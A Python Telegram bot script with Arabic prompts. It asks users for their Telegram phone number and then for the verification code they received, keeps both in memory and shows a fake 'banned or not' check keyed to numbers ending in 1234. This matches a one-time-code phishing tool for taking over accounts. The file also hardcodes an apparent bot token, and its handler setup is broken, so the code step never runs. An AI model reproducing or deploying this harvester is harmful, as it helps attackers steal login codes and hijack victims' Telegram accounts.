import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
import phonenumbers

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = "6529257547:AAG2MGxNXMLGxQtyUtA2zWEylP9QD5m-hGE"

users_data = {}

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("👋 مرحباً! الرجاء إدخال رقم التليجرام الخاص بك:")

def handle_number(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    user_number = update.message.text

    try:
        phone_number = phonenumbers.parse(user_number, "IN")
        if phonenumbers.is_valid_number(phone_number):
            users_data[user_id] = {'phone_number': user_number}
            update.message.reply_text("✅ تم استقبال الرقم. الرجاء إدخال رمز التحقق الذي تلقيته:")
        else:
            update.message.reply_text("❌ الرقم غير صحيح. الرجاء إدخال رقم صحيح:")
    except phonenumbers.phonenumberutil.NumberParseException:
        update.message.reply_text("❌ الرقم غير صحيح. الرجاء إدخال رقم صحيح:")

def handle_code(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    user_code = update.message.text

    if user_id in users_data:
        users_data[user_id]['verification_code'] = user_code
        update.message.reply_text("✅ تم استقبال رمز التحقق.")
        
        # فحص الرقم هنا (مثال بسيط للتحقق إذا كان الرقم محظورًا)
        if users_data[user_id]['phone_number'].endswith("1234"):
            update.message.reply_text("🚫 الرقم محظور.")
        else:
            update.message.reply_text("✅ الرقم صالح وغير محظور.")
    else:
        update.message.reply_text("❌ لم يتم استقبال رقم الهاتف. الرجاء إرسال رقم الهاتف أولاً.")

def main() -> None:
    updater = Updater(TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_number))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_code))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
